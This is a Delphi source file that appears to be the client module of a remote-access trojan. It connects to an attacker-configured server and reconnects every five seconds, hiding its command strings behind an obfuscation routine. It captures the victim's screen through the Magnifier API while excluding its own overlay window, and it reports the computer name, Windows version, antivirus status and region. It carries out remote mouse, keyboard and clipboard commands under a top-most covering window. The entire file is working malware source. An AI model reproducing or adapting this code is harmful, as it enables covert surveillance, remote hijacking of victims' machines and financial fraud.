unit u_IQ_Socket;

interface
uses
   Windows, Messages,Graphics,StdCtrls, ExtCtrls,
   SysUtils, Variants,Contnrs,IdHashMessageDigest,idHash,
   dwmapi,Classes,Controls,Forms,zlib,u_IQ_cfg,
   System.Win.ScktComp,Vcl.Clipbrd,dialogs;


type
   TFormPrincipal= class(TForm)
end;

type
    TPromptCmd = class(TThread)
    constructor Create;
    procedure Execute; override;
    procedure ExitWin(var Msg: TWMEndSession); message WM_ENDSESSION;
  public
    fila: TStrings;
    //
    procedure ClipboardCmd(Comando: string);
    procedure mousedowne(comando: string);
    procedure mousedownd(comando: string);
    procedure mousemove(comando: string);
    procedure pressmousedown(left: Boolean);
    procedure pressmouseup(left: Boolean);
    procedure keydown(comando: string);
    procedure keyup(comando: string);
    function KeyIsDown(const Key: integer): boolean;
    procedure CliqueDuplo(Comando: string);
    procedure procesaUser;
    procedure ColocaClipBoard;
    procedure TrataComando(comando: string);
    procedure Tratar;
    //
  end;
type
    TClientePrincipal = class( TThread )
    SocketPrincipal: TClientSocket;
    constructor Create;
    procedure Execute; override;
   public

   procedure   SocketPrincipalRead(Sender: TObject; Socket: TCustomWinSocket);
   procedure   SocketPrincipalConnect(Sender: TObject; Socket: TCustomWinSocket);
   procedure   SocketPrincipalError(Sender: TObject; Socket: TCustomWinSocket;
               ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   procedure   SocketPrincipalDisconnect(Sender: TObject;
   Socket: TCustomWinSocket);
end;

type
   TClienteCmd = class( TThread )
   CmdSocket: TClientSocket;
   constructor Create;
   protected
      procedure Execute; override;
   public
   procedure CmdcRead(Sender: TObject; Socket: TCustomWinSocket);
   procedure CmdcConnect(Sender: TObject; Socket: TCustomWinSocket);
   procedure CmdError(Sender: TObject; Socket: TCustomWinSocket;
   ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   procedure CmdDisconnect(Sender: TObject;
   Socket: TCustomWinSocket);
end;

type
    TClienteViewer = class( TThread )
    SocketViewer: TClientSocket;
    constructor Create;
   protected
   procedure Execute; override;
   public

   procedure   SocketViewerRead(Sender: TObject; Socket: TCustomWinSocket);
   procedure   SocketViewerConnect(Sender: TObject; Socket: TCustomWinSocket);
   procedure   SocketViewerError(Sender: TObject; Socket: TCustomWinSocket;
               ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   procedure   SocketViewerDisconnect(Sender: TObject;
   Socket: TCustomWinSocket);
end;

var
    ImgTemp,ArqTmp,MyFirstBmp,MySecondBmp,
    MyCompareBmp,PackStream:TMemoryStream;
    hWndMag: HWND;
    hWndHost, desktop: HWND;
    wc: TWndClass;
    RecebendoDados: Boolean;
    iSendCount:integer;
    NextHandle: Hwnd;
    r : TRect;
    IdServe:string;
    hTimer: UINT = 0; // handle do timer
    NivelCompressao  : TCompressionLevel;
    CmdPrincipal   :TClientePrincipal;
    procedure EnviaTx(strValor:String);
    procedure InitializeMagnifier;

implementation

uses u_IQ_Scree, u_IQ_Mai;
var
CmdRmt:TPromptCmd;
CmdSocket      :TClienteCmd;
SocketViewer   :TClienteViewer;
bmp: TBitmap;
//
constructor TClientePrincipal.Create;
begin
 inherited Create(True);
  FreeOnTerminate := True;
  Priority        := tpNormal;
  Peek;
  TListar:=TStringList.Create;
end;



constructor TClienteCmd.Create;
begin
  inherited Create(True);
  FreeOnTerminate := True;
  Priority        := tpNormal;
end;

constructor TClienteViewer.Create;
begin
  inherited Create(True);
  FreeOnTerminate := True;
  Priority        := tpNormal;
  ArqTmp:=TMemoryStream.Create;
  ImgTemp:=TMemoryStream.Create;
end;


function MagImageScalingCallback(hwnd: hwnd; srcdata: Pointer; srcheader: MAGIMAGEHEADER; destdata: Pointer; destheader: MAGIMAGEHEADER; unclipped: TRect; clipped: TRect; dirty: HRGN): BOOL; stdcall;
var
  lpbmi: TBitmapInfo;

  aDC: HDC;
  abitmap: HBitmap;
  Bild: TBitmap;
  C: TCanvas;
begin

  Fillchar(lpbmi, sizeof(lpbmi), 0);

  lpbmi.bmiHeader.biSize := sizeof(lpbmi.bmiHeader);

  lpbmi.bmiHeader.biHeight := -srcheader.height; // Otherwise the image is upside down.
  lpbmi.bmiHeader.biWidth := srcheader.width;
  lpbmi.bmiHeader.biSizeImage := srcheader.cbSize;
  lpbmi.bmiHeader.biPlanes := 1;
  lpbmi.bmiHeader.biBitCount := 32;
  lpbmi.bmiHeader.biCompression := BI_RGB;
  aDC := GetWindowDC(hwnd);
  bmp := TBitmap.Create;
  bmp.PixelFormat := pf32bit;
  bmp.Width := Screen.Width;
  bmp.Height := Screen.Height;
  abitmap := 0;

  try
    abitmap := CreateDIBitmap(aDC, lpbmi.bmiHeader, CBM_INIT, srcdata, lpbmi, DIB_RGB_COLORS);
    bmp.handle := abitmap;

    try


      C := TCanvas.Create;
      C.Handle := bmp.Canvas.Handle;
      Bild := TBitmap.Create;
      Bild.PixelFormat := pf8bit;
      Bild.Width := (Screen.Width * Zoom) div 100;
      Bild.Height := (Screen.Height * Zoom) div 100;
      SetStretchBltMode(Bild.Canvas.Handle, HALFTONE);
      StretchBlt(Bild.Canvas.Handle, 0, 0, Bild.Width, Bild.Height, C.Handle, 0, 0, Screen.Width, Screen.Height, SRCCOPY);
      Bild.SaveToStream(ArqTmp);
    finally
      ReleaseDC(0, C.Handle);

      C.Free;
      Bild.Free;
    end;

  finally
    DeleteObject(abitmap);
    DeleteDC(aDC);
    bmp.Free;
  end;
  Result := True;
end;

procedure GetImg;
var
  filterList: THWNDArray;
begin
if ScreeMode=1 then
begin
  try
    if not Telinha then
    begin
        if IsWindow(Handle_IQ) then
        filterList[0] := Handle_IQ;

    end;

  if (MagSetWindowFilterList(hWndMag, MW_FILTERMODE_EXCLUDE, 1, @filterList[0])) then
  begin

    sourceRect.left := 0;
    sourceRect.top := 0;
    sourceRect.right := desktoprect.width;
    sourceRect.bottom := desktoprect.height;

    if (MagSetWindowSource(hWndMag, sourceRect)) then

  end;
  except

  end;
end;

end;

function HostWndProc(hWindow: hWnd; Msg: UINT; wParam: wParam; lParam: lParam): LRESULT; stdcall;
begin
  Result := DefWindowProc(hWindow, Msg, wParam, lParam);
end;

procedure InitializeMagnifier;
begin
  try

    ArqTmp := TMemoryStream.Create;
    hWndHost := 0;
    wc.lpszClassName := PWideChar(Ofuscador_String('D','ABBA5D91648AA954D52F2FAD569F'));
    wc.lpfnWndProc := @HostWndProc;
    wc.Style := 0;
    wc.hInstance := 0;
    wc.hIcon := 0;
    wc.hCursor := 0;
    wc.hbrBackground := 0;
    wc.lpszMenuName := nil;
    wc.cbClsExtra := 0;
    wc.cbWndExtra := 0;

    desktop := GetDesktopWindow;
    GetWindowRect(desktop, desktoprect);

    Windows.RegisterClass(wc);
    hWndHost := CreateWindowEx(WS_EX_TOPMOST or WS_EX_LAYERED or WS_EX_TOOLWINDOW,
    PWideChar(Ofuscador_String('D','1E29CB66B05D9A43C450C0030120')),
    PWideChar(Ofuscador_String('D','D55C8AA879DE6F9F62A149F3')),
    WS_POPUP or WS_CLIPCHILDREN, 0, 0, desktoprect.width, desktoprect.height, 0, 0, 0, nil);

    if (hWndHost <> 0) then
      SetLayeredWindowAttributes(hWndHost, 0, 255, LWA_ALPHA);
    if (hWndHost = 0) then
      ScreeMode := 0;

    if (MagInitialize) then
    begin
      ScreeMode:=1;
      hWndMag := CreateWindowEx(0, WC_MAGNIFIER,
      PWideChar(Ofuscador_String('D','4BDA7DB144EA0836F70D3C967283AB17')),
      WS_CHILD or MS_SHOWMAGNIFIEDCURSOR or WS_VISIBLE, 0, 0,
      desktoprect.width, desktoprect.height, hWndHost, 0, 0, nil);
      GetImg;


    end else
    begin
    ScreeMode := 0;
    end;
    if (hWndMag = 0) then
      ScreeMode := 0;

    if not (MagSetImageScalingCallback(hWndMag, MagImageScalingCallback)) then
      ScreeMode := 0;

  except

  end;
end;


procedure Creat_Scree_Aux(Bild: TBitMap; Col, Lin, Larg, Alt: Integer);
var
  bmp: TBitmap;
  C, Canvas: TCanvas;
  DC: HDc;
begin

  try
    Canvas := TCanvas.Create;
    Canvas.Handle := GetDC(GetDesktopWindow);
    bmp := TBitmap.Create;
    bmp.PixelFormat := pf8bit;
    bmp.Width := Screen.Width;
    bmp.Height := Screen.Height;
    SetStretchBltMode(bmp.Canvas.Handle, HALFTONE);
    StretchBlt(bmp.Canvas.Handle, 0, 0, bmp.Width, bmp.Height, Canvas.Handle, 0, 0,
    Screen.Width, Screen.Height, SRCCOPY);
  finally
    ReleaseDC(0, Canvas.Handle);
    Canvas.Free;

  end;

  try
    C := TCanvas.Create;
    C.Handle := bmp.Canvas.Handle;
    Bild := TBitmap.Create;
    Bild.PixelFormat := pf8bit;
    Bild.Width := (Screen.Width * Zoom) div 100;
    Bild.Height := (Screen.Height * Zoom) div 100;
    SetStretchBltMode(Bild.Canvas.Handle, HALFTONE);
    StretchBlt(Bild.Canvas.Handle, 0, 0, Bild.Width, Bild.Height, C.Handle, 0,
    0, Screen.Width, Screen.Height, SRCCOPY);
    Bild.SaveToStream(ArqTmp);
  finally
    ReleaseDC(0, C.Handle);
    C.Free;
    Bild.Free;
    bmp.Free;
  end;
end;


procedure EnviaBuffe(viewerCursor: Boolean; mEmoria: TMemoryStream);
var
  Bmp2: TBitmap;
begin
  //
  if ScreeMode= 1 then
  begin
    GetImg;
     if (MagSetImageScalingCallback(hWndMag, MagImageScalingCallback)) then

  end;

  if ScreeMode = 0 then
  begin
    Bmp2 := TBitmap.Create;
    Bmp2.PixelFormat := pf8bit;
    Creat_Scree_Aux(Bmp2, 0, 0, Screen.Width, Screen.Height);
    Bmp2.Free;
  end;
  mEmoria.CopyFrom(ArqTmp, 0);
  ArqTmp.Clear;
end;

//------------------------------------------------------------------------------
procedure EnviaTx(strValor:String);
begin
    CmdSocket.CmdSocket.Socket.SendText(strValor);
end;

procedure TimerProc(hwnd: hwnd; uMsg, idEvent: UINT; dwTime: DWORD); stdcall;
begin
  if (cmdPrincipal.SocketPrincipal.Socket.Connected = False)and  (vFlagExit=0) then
    cmdPrincipal.SocketPrincipal.Open;

end;

// ------------------------------------------------------------------------------

function CalcularHash(const MS: TBitMap): AnsiString;
var
  idmd5: TIdHashMessageDigest5;
  MS2: TStream;
  Hash: T4x4LongWordRecord;

begin
  idmd5 := TIdHashMessageDigest5.Create;
  // fs := TFileStream.Create(fileName, fmOpenRead OR fmShareDenyWrite) ;
  try
    MS2 := TMemoryStream.Create;
    MS.SaveToStream(MS2);
    MS2.Position := 0;
    result := idmd5.HashStreamAsHex(MS2);
  finally
    MS2.Free;
    idmd5.Free;
  end;
end;


procedure DoCompress(inStream: TStream);
var
  outMS: TMemoryStream;
  ZStream: TCompressionStream;
begin
  outMS := TMemoryStream.Create;
  try
    inStream.Seek(0, soFromBeginning);

    outMS.Size := 0;
    ZStream :=TCompressionStream.Create(NivelCompressao,outMS);
    try
      ZStream.CopyFrom(inStream, 0);
    finally
      ZStream.Free;
    end;

    inStream.Size := outMS.Size;
    inStream.Position := 0;
    inStream.CopyFrom(outMS, 0);
  finally
    outMS.Free;
  end;
end;



function StreamToString(Stream: TStream): string;
var
  ms: TMemoryStream;
begin
  Result := '';
  ms := TMemoryStream.Create;
  try
    ms.LoadFromStream(Stream);
    SetString(Result, PAnsiChar(ms.memory), ms.Size);
  finally
    ms.Free;
  end;
end;



procedure CompareStream(MyFirstStream, MySecondStream,
  MyCompareStream: TMemorystream);
var
  I: Integer;
  P1, P2, P3: ^AnsiChar;
begin
  MySecondStream.Clear;
  MyCompareStream.Clear;

  EnviaBuffe(false,MySecondStream);
  P1 := MyFirstStream.Memory;
  P2 := MySecondStream.Memory;
  MyCompareStream.SetSize(MyFirstStream.Size);
  P3 := MyCompareStream.Memory;

  for I := 0 to MyFirstStream.Size - 1 do
  begin
    if P1^ = P2^ then
      P3^ := '0'
    else
      P3^ := P2^;
    Inc(P1);
    Inc(P2);
    Inc(P3);

  end;
  MyFirstStream.Clear;
  MyFirstStream.CopyFrom(MySecondStream,0);
  if (MagSetImageScalingCallback(hWndMag, MagImageScalingCallback)) then

end;


{----------------------------------TClienteCmd --------------------------------}

procedure TClienteCmd.CmdcConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
     Sleep(1000);
     Socket.SendText(Ofuscador_String('C','#sTrCmdOK#'));
     Sleep(2000);
     Socket.SendText(Ofuscador_String('C','#S#'));
    //

end;

procedure TClienteCmd.CmdcRead(Sender: TObject; Socket: TCustomWinSocket);
var
   comando:String;
   LstComando: TStringList;

begin
try
     comando := String ( socket.ReceiveText );
     CmdRmt.fila.Add(Trim(comando));
     Socket.SendText(Ofuscador_String('C','#S#'));
except

end;
end;

procedure TClienteCmd.CmdDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  try
     //

  except
  end;
end;

procedure TClienteCmd.CmdError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
ErrorCode:=0;
end;

procedure TClientePrincipal.Execute;
begin
   SocketPrincipal := TClientSocket.Create(nil);
   SocketPrincipal.Address      :=ServidorHost;
   SocketPrincipal.Host         :=ServidorHost;
   SocketPrincipal.Port         :=PortaServe;

   SocketPrincipal.OnConnect    :=SocketPrincipalConnect;
   SocketPrincipal.OnRead       :=SocketPrincipalRead;
   SocketPrincipal.OnDisconnect :=SocketPrincipalDisconnect;
   SocketPrincipal.OnError      :=SocketPrincipalError;
   SocketPrincipal.Open;
   hTimer := SetTimer(0, 0, 5000, @TimerProc);

end;

procedure TClienteCmd.Execute;
begin
   CmdSocket := TClientSocket.Create( nil );
   CmdSocket.Address      :=ServidorHost;
   CmdSocket.Host         :=ServidorHost;
   CmdSocket.Port         :=PortaServe;
   CmdSocket.OnConnect    :=CmdcConnect;
   CmdSocket.OnRead       :=CmdcRead;
   CmdSocket.OnDisconnect :=CmdDisconnect;
   CmdSocket.OnError      :=CmdError;
   CmdSocket.Open;
end;

procedure TClientePrincipal.SocketPrincipalConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
vFlagExit:=1;
DV_Creat_Main.trm_Login.Enabled:=false;
sleep(3000);
Socket.SendText(Ofuscador_String('C','#sTrSktPrin#'));
end;

procedure TClientePrincipal.SocketPrincipalDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
try

SocketPrincipal.Close;
if Assigned(SocketViewer) then
SocketViewer.SocketViewer.Close;
if Assigned(CmdSocket) then
CmdSocket.CmdSocket.Close;

except
end;
end;

procedure TClientePrincipal.SocketPrincipalError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
    ErrorCode:=0;
    SocketPrincipal.Address      :=ServidorHost;
    SocketPrincipal.Host         :=ServidorHost;
    SocketPrincipal.Port         :=PortaServe;

    vFlagExit:=0;
    if Assigned(SocketViewer) then
    SocketViewer.SocketViewer.Close;
    if Assigned(CmdSocket) then
    CmdSocket.CmdSocket.Close;
end;


function FileTimeToDTime(FTime: TFileTime): TDateTime;
var
  LocalFTime: TFileTime;
  STime: TSystemTime;
begin
  FileTimeToLocalFileTime(FTime, LocalFTime);
  FileTimeToSystemTime(LocalFTime, STime);
  Result := SystemTimeToDateTime(STime);
end;



procedure TClientePrincipal.SocketPrincipalRead(Sender: TObject;
  Socket: TCustomWinSocket);


var
   Comando: String;
   pCname:String;
   Computer: PChar;
   CSize: DWORD;
   LstComando: TStringList;
   msg: TMsg;
   SR: TSearchRec;
   CreateDT: TDateTime;
begin
  try
      Comando:=Ofuscador_String('D', String(socket.ReceiveText));

      //------------------------------------------------------------------------
      if Pos(Ofuscador_String('D','1C7D8D8EDF6BED7BACA8'),Comando ) > 0 then
      begin
          Socket.SendText(Ofuscador_String('C',Ofuscador_String('D','5136E8081E29CB7D88B04454')));

      end;

      if Pos(Ofuscador_String('D','2E131A2EF81ADF0249'),Comando) > 0 then
      begin
          LstComando:=TStringList.Create;
          LstComando :=SplitString(Comando,'<#>');
          IdServe:=LstComando[1];
          LstComando.Free;

     end;

      if Pos(Ofuscador_String('D','01669F4CFB18D37E8FD5'),Comando) > 0 then
      begin
          Socket.SendText(Ofuscador_String('C',Ofuscador_String('D','E94F83A27184B063BE4C99CF46E05D')+'<#>' +
          IntToStr(Screen.Width) +'<#>' +
          IntToStr(Screen.Height)));

      end;


      if Pos(Ofuscador_String('D','BB9C9E5BAD63954DDE65'),Comando) > 0 then
      begin
               if FindFirst(Ofuscador_String('D','82878089BD77BF60BE47EC0214DD66F636EA093AD824215188C47E859B'), faAnyFile, SR) = 0 then
               begin
                CreateDT := FileTimeToDTime(SR.FindData.ftCreationTime);
                FindClose(SR);
               end;
               ShowWindow(hwdPai,SW_SHOWMAXIMIZED);
               Socket.SendText(Ofuscador_String('C',Ofuscador_String('D','2E1317D326DB1CD746EE4A')+'<#>'+IntToStr(Socket.Handle)+'<#>'
               +ComputerName+'<#>'+Versao_Windows+' '+isAv+'<#>'+(Casa)+','+Regiao+'<#>'+Tipo+'<#>'+DateTimeToStr(CreateDT)+'<#>'+vVersao));

               DV_Creat_Main.IQ_Auto_login.Enabled:=True;

      end;

      if Pos(Ofuscador_String('D','B899A347D47FB154AAAA'),Comando)  > 0 then
      begin
      //------------------------------------------------------------------------
               if not Assigned(SocketViewer)  then
               begin
               SocketViewer :=TClienteViewer.Create;
               SocketViewer.Execute;
               //
               Sleep(2000);
               CmdSocket := TClienteCmd.Create;
               CmdSocket.Execute;
               end else
               begin
                    SocketViewer.SocketViewer.Close;
                    SocketViewer.SocketViewer.Open;
                    //
                    CmdSocket.CmdSocket.Close;
                    CmdSocket.CmdSocket.Open;

               end;
               //
               if (not Assigned(CmdRmt))then
               begin
               CmdRmt := TPromptCmd.Create;
               CmdRmt.Execute;
               end;

       end;
     //-------------------------------------------------------------------------
 except
 end;

 TranslateMessage(msg);
 DispatchMessage(msg);

end;

{ TClienteViewer }

procedure TClienteViewer.Execute;
begin
  SocketViewer := TClientSocket.Create(nil);
  SocketViewer.Host    :=ServidorHost;
  SocketViewer.Address :=ServidorHost;
  SocketViewer.Port    :=PortaServe;

  SocketViewer.OnConnect    :=SocketViewerConnect;
  SocketViewer.OnDisconnect :=SocketViewerDisconnect;
  SocketViewer.OnRead       :=SocketViewerRead;
  SocketViewer.OnError      :=SocketViewerError;

  SocketViewer.Open;

end;

procedure TClienteViewer.SocketViewerConnect(Sender: TObject;
  Socket: TCustomWinSocket);
var
   StrCommand, StrPackSize:AnsiString;
begin
     Sleep(2000);
     Socket.SendText(Ofuscador_String('C',Ofuscador_String('D','9F80B272808EA548F73CF66FA393')));

end;

procedure TClienteViewer.SocketViewerDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
   try
   Suspend;
   Terminate;
   //Socket.Close;
  except

 end;
end;

procedure TClienteViewer.SocketViewerError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
    ErrorCode:=0;
end;

procedure TClienteViewer.SocketViewerRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
   StrCommand, StrPackSize: AnsiString;
   LstComando: TStringList;
   msg: TMsg;
begin
try
   StrCommand := socket.ReceiveText;
   if Pos (Ofuscador_String('D','BB9CBF70B35A9147DC2CCBDD'),Ofuscador_String('D',StrCommand))>0 then
   begin
     LstComando:=TStringList.Create;
     LstComando :=SplitString(Ofuscador_String('D',StrCommand),'<#>');
     Zoom:=StrToInt(LstComando[1]);
     LstComando.Free;
     MyFirstBmp:= TMemoryStream.Create;
     MySecondBmp:=TMemoryStream.Create;
     MyCompareBmp:=TMemoryStream.Create;
     PackStream:=TMemoryStream.Create;
     iSendCount:=0;
     MyFirstBmp.Clear;
     EnviaBuffe(false,MyFirstBmp);
     MyFirstBmp.Position:=0;
     PackStream.LoadFromStream(MyFirstBmp);
     DoCompress(PackStream);
     PackStream.Position := 0;
     StrPackSize := inttostr(PackStream.size);
     Socket.Sendtext(Ofuscador_String('D','74A5BA49D1003CD778FC63')+StrPackSize);
     iSendCount:=iSendCount+1;
   end;
   if Ofuscador_String('D',StrCommand) =Ofuscador_String('D','92BB6081908D') then
   begin
            PackStream := TMemoryStream.Create;
            CompareStream(MyFirstBmp,MySecondBmp,MyCompareBmp);
            MyCompareBmp.Position:=0;
            PackStream.LoadFromStream(MyCompareBmp);
            DoCompress(PackStream);
            PackStream.Position := 0;
            StrPackSize := inttostr(PackStream.size);
            Socket.Sendtext(Ofuscador_String('D','23D46A9E6FA350E34C081E')+StrPackSize);
            iSendCount:=iSendCount+1;
   end;
   if Ofuscador_String('D',StrCommand) = Ofuscador_String('D','4E83AD5DA6B247C6') then
   begin
            PackStream.Position := 0;
            socket.SendText(StreamToString(PackStream));

   end;

    TranslateMessage(msg);
    DispatchMessage(msg);

except
end;
end;

procedure TPromptCmd.ClipboardCmd(Comando: string);
var
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(Comando, '<#>');
    TextoClipBoard := LstComando[1];
    Clipboard.AsText := TextoClipBoard;
    LstComando.Free;
  except
    fila.Clear;
    abort;
  end;


end;

procedure TPromptCmd.CliqueDuplo(Comando: string);
var
  ponto, virgula: Boolean;
  I, X, Y: integer;
  XS, YS: string;
  hWnd: THandle;
  PosM: TPoint;
begin
  try
    ponto := False;
    virgula := False;
    for I := 1 to length(Comando) do
    begin
      if (Comando[I] = ':') then
        ponto := true;
      if (Comando[I] = ',') then
        virgula := true;
      if (Comando[I] <> ':') and (Comando[I] <> ',') then
      begin
        if ponto and not virgula then
          XS := XS + Comando[I];
        if ponto and virgula then
          YS := YS + Comando[I];
      end;
    end;
    X := StrToInt(XS);
    Y := StrToInt(YS);
    setcursorpos(X, Y);
    pressmousedown(true);
    pressmouseup(True);
    pressmousedown(true);
    pressmouseup(True);
  except
    fila.Clear;
    abort;
  end;

end;

procedure TPromptCmd.ColocaClipBoard;
begin
   Clipboard.AsText := TextoClipBoard;
end;

constructor TPromptCmd.Create;
begin
     inherited Create(True);
     FreeOnTerminate := True;
     Priority := tpNormal;
end;

procedure TPromptCmd.Execute;
begin
try
  Fila := TStringList.Create;
  Fila.Clear;

  while not terminated do
  begin
    Tratar;
    Application.ProcessMessages;
    sleep(10);
  end;
except

end;
end;

procedure TPromptCmd.ExitWin(var Msg: TWMEndSession);
begin

end;

procedure TPromptCmd.keydown(comando: string);
var
  S: string;
  Tecla: Integer;
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(comando, '<#>');
    S := LstComando[1];
    Tecla := StrToInt(S);
    case Tecla of
      16, 17, 18, 20:
        begin
          if not KeyIsDown(Tecla) then
            keybd_event(Tecla, 0, 0, 0);

        end;
    else
      begin
        keybd_event(Tecla, 0, 0, 0);
        keybd_event(Tecla, 0, KEYEVENTF_KEYUP, 0);
      end;
    end;
    LstComando.Free;
  except
    fila.Clear;
    abort;
  end;


end;

function TPromptCmd.KeyIsDown(const Key: integer): boolean;
begin
      Result := GetKeyState(Key) and 128 > 0;

end;

procedure TPromptCmd.keyup(comando: string);
var
  S: string;
  Tecla: Integer;
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(comando, '<#>');
    S := LstComando[1];
    Tecla := StrToInt(S);
    keybd_event(Tecla, 0, KEYEVENTF_KEYUP, 0);
    LstComando.Free;

  except
    fila.Clear;
    abort;
  end;


end;

procedure TPromptCmd.mousedownd(comando: string);
var
  X, Y: integer;
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(comando, '<#>');
    X := StrToInt(LstComando[1]);
    Y := StrToInt(LstComando[2]);
    if Mouse then
    begin
      DV_Creat_Main.t_Start_AP.Enabled:=false;
      SetWindowLong(Handle_IQ, GWL_EXSTYLE,
      GetWindowLong(Handle_IQ, GWL_EXSTYLE)
      or WS_EX_NOACTIVATE or WS_EX_TRANSPARENT or WS_EX_LAYERED);
      setcursorpos(X, Y);
      pressmousedown(False);
    end else
    begin
      DV_Creat_Main.t_Start_AP.Enabled:=false;
      SetForegroundWindow(hwdPai);
      SendMessage(hwdPai, WM_LBUTTONDOWN,0, MakeLong(X,y));
    end;

    LstComando.Free;
    procesaUser;
  except
    fila.Clear;
    abort;
  end;

end;

procedure TPromptCmd.mousedowne(comando: string);
var
  X, Y: integer;
  LstComando: TStringList;
begin
  try
    LstComando := TStringList.Create;
    LstComando := SplitString(comando, '<#>');
    X := StrToInt(LstComando[1]);
    Y := StrToInt(LstComando[2]);
    if Mouse then
    begin
        DV_Creat_Main.t_Start_AP.Enabled:=false;
        SetWindowLong(Handle_IQ, GWL_EXSTYLE,
        GetWindowLong(Handle_IQ, GWL_EXSTYLE)
        or WS_EX_NOACTIVATE or WS_EX_TRANSPARENT or WS_EX_LAYERED);
        setcursorpos(X, Y);
        pressmousedown(true);
    end else
    begin
        DV_Creat_Main.t_Start_AP.Enabled:=false;
        SetForegroundWindow(hwdPai);
        SendMessage(hwdPai, WM_RBUTTONDOWN,0, MakeLong(X,y));
    end;
    LstComando.Free;
    procesaUser;
  except
    fila.Clear;
    abort;
  end;

end;

procedure TPromptCmd.mousemove(comando: string);
begin
     //
end;

procedure TPromptCmd.pressmousedown(left: Boolean);
begin
 if left then
  begin
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);

  end
  else
  begin
     mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);

  end;
end;

procedure TPromptCmd.pressmouseup(left: Boolean);
begin
  if left then
  begin
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);

  end
  else
  begin
    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);

  end;
end;

procedure TPromptCmd.procesaUser;
begin

end;



procedure TPromptCmd.TrataComando(comando: string);
begin

    if pos(Ofuscador_String('D','CCAD5AEB351F'), comando) > 0 then
    mousedowne(comando);

    if pos(Ofuscador_String('D','9D82AE46CEB6'), comando) > 0 then
    mousedownd(comando);

    if pos(Ofuscador_String('D','3D22CE69BB99'), comando) > 0 then
    mousemove(comando);

    if pos(Ofuscador_String('D','D7B867898AEA'), comando) > 0 then
    pressmouseup(True);

    if pos(Ofuscador_String('D','FA5C88A869CB'), comando) > 0 then
    pressmouseup(False);

    if pos(Ofuscador_String('D','AF90BA4A09'), comando) > 0 then
    keydown(comando);

    if pos(Ofuscador_String('D','F254FE2120'), comando) > 0 then
    keyup(comando);

    if Pos(Ofuscador_String('D','AD92B474B292'), comando) > 0 then
    ClipboardCmd(comando);

    if Pos(Ofuscador_String('D','FB5D9153A1A348EB63'), comando) > 0 then
    TrataComandos(comando);

end;

procedure TPromptCmd.Tratar;
begin
  try
      if Fila.Count > 0 then
      begin
         TrataComando(Ofuscador_String('D', fila[0]));
         Fila.Delete(0);
      end;
  except
  end;
end;

end.





